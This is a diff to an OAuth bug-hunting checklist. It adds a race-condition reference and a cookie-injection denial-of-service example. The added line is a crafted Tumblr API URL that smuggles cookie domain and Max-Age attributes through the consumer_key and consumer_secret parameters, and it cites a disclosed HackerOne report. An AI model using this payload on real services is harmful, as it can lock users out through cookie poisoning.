@@ -21,3 +21,7 @@ Things need to check while hunting:
 **Race Condition on Oauth**
 
 1. https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html
+
+**Oauth Cookie Injection to DoS**
+
+https://api.tumblr.com/console/auth?consumer_key=x;%20domain=tumblr.com;%20Max-Age=1000000000000000000000&consumer_secret=x;%20domain=tumblr.com;%20Max-Age=1000000000000000000000    https://hackerone.com/reports/1005421
